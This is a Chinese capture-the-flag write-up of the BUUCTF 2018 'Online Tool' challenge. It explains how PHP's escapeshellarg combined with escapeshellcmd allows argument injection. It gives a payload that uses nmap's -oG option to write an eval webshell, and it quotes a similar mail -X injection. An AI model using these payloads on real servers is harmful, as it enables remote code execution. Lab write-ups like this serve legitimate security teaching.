---
title: "[BUUCTF 2018]Online Tool"
date: 2020-05-20 12:51:01
tags: Web
---

代码审计php

**escapeshellarg和escapeshellcmd使用不当导致rce**

两个函数配合使用就会导致多个参数的注入。

> escapeshellarg和escapeshellcmd的功能
>
> **escapeshellarg**
>
> 1.确保用户只传递一个参数给命令
>  2.用户不能指定更多的参数一个
>  3.用户不能执行不同的命令
>
> **escapeshellcmd**
>
> 1.确保用户只执行一个命令
>  2.用户可以指定不限数量的参数
>  3.用户不能执行不同的命令

关于escapeshellarg和escapeshellcmd使用不当导致rce

在https://paper.seebug.org/164/有详解

我们在这摘取

> 1. 传入的参数是：172.17.0.2' -v -d a=1
> 2. 经过escapeshellarg处理后变成了'172.17.0.2'\'' -v -d a=1'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
> 3. 经过escapeshellcmd处理后变成'172.17.0.2'\\'' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个**不配对儿**的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
> 4. 最后执行的命令是curl '172.17.0.2'\\'' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'没有被转义，与再后面的'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d     a=1'，即向172.17.0.2\发起请求，POST 数据为a=1'。
>
> 回到mail中，我们的 payload 最终在执行时变成了'-fa'\\''\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\'，分割后就是-fa\(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。
>
> 使用escapeshellcmd / escapeshellarg时不可能执行第二个命令。
>
> 但是我们仍然可以将参数传递给第一个命令。
>
> 这意味着我们也可以将新选项传递给命令。
>
> 利用漏洞的能力取决于目标可执行文件。

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}> 
```

> HTTP_X_FORWARDED_FOR获取到的IP地址
>
> REMOTE_ADDR代表着客户端的IP
>
> 这两个都为比较常见的服务器获取ip

> echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);

这有个system来执行命令有传参。

本意是要输入ip参数来进行扫描，我们可以利用两个函数的漏洞，来过滤。

**-oG**可以实现将命令和结果写到文件

payload可以通过写一个Shell到文件中

由此构造payload：

> '<?php @eval($_POST["hack"]); ?> -oG hack.php '

转化为：

> ''[\\''\<\?php](file://''/ @eval\(\$_POST\["hack"\]\)\; \?\> -oG hack.php '\\'''

输出为：

> \<?php @eval($_POST[hack]); ?> -oG hack.php \\

菜刀连接即可

参考链接：

http://lz2y.top/index.php/2020/03/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-buuctf-2018online-tool/

https://note.redmango.top/Online%20Tool(BUUCTF%202018)/

https://paper.seebug.org/164/

https://blog.csdn.net/qq_26406447/article/details/100711933

https://blog.csdn.net/weixin_44077544/article/details/102835099